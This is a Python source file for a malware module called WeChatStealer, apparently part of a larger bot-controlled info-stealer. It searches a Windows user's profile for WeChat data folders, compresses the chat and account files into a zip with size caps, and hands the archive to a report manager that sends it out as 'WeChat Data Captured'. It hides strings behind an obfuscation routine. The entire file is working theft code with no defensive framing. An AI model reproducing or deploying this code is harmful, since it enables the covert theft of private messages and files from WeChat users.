import os
import shutil
import zipfile
import time
from typing import Dict
from core.obfuscation import decrypt_string
from core.base import BaseModule

class WeChatStealer(BaseModule):
    def __init__(self, bot=None, report_manager=None, temp_dir=None):
        super().__init__(bot, report_manager, temp_dir)
        self.user_profile = os.expanduser('~') if hasattr(os, 'expanduser') else os.path.expanduser('~')
        self.wechat_paths = [
            os.path.join(self.user_profile, 'Documents', 'WeChat Files'),
            os.path.join(self.user_profile, 'AppData', 'Roaming', 'Tencent', 'WeChat'),
            os.path.join(self.user_profile, 'AppData', 'Local', 'Tencent', 'WeChat')
        ]
        self.last_run_size = 0.0

    def run(self) -> bool:
        """A-04: Standardized run method."""
        try:
            self.log("Starting WeChat data extraction...")
            result = self.steal_data()
            self.last_run_size = result.get('size_mb', 0.0)
            
            if result.get('zip_path') and self.report_manager:
                self.log(f"WeChat data captured ({self.last_run_size:.2f} MB). Sending report...")
                self.report_manager.send_output_zip(result['zip_path'], "📟 WeChat Data Captured")
            
            return True if result.get('found') else False
        except Exception as e:
            self.log(f"WeChat extraction failed: {e}")
            return False

    def get_stats(self) -> Dict[str, int]:
        return {"size_mb": int(self.last_run_size)}
    def steal_data(self):
        result = {'found': False, 'size_mb': 0.0, 'zip_path': None}
        found_path = None
        for path in self.wechat_paths:
            if os.path.exists(path):
                try:
                    items = os.listdir(path)
                    if any("wxid_" in p for p in items) or "All Users" in items:
                        found_path = path
                        break
                except Exception:
                    pass
        if not found_path:
            return result
        try:
            zip_path = os.path.join(self.temp_dir, decrypt_string("GVcbAy8lBhkzGR4QBlALH0BGEQYreXBLJ1kQUQI="))
            total_size_val: int = 0
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, dirs, files in os.walk(str(found_path)):
                    for file in files:
                        file_path = os.path.join(root, file)
                        try:
                            fsize = int(os.path.getsize(file_path))
                            if fsize > 20 * 1024 * 1024:  
                                continue
                            if (total_size_val + fsize) > 100 * 1024 * 1024:  
                                break
                            arcname = os.path.relpath(file_path, os.path.dirname(str(found_path)))
                            zipf.write(file_path, arcname)
                            total_size_val += fsize 
                        except Exception:
                            pass
                    if total_size_val > 100 * 1024 * 1024:
                        break
            final_size: int = int(total_size_val)
            if os.path.exists(zip_path):
                result['found'] = True
                result['size_mb'] = float(final_size) / (1024.0 * 1024.0)
                result['zip_path'] = str(zip_path)
        except Exception as e:
            print(decrypt_string("NRMlSxk0Ggo7A0pdAEsJCFQSAw4z"))
        return result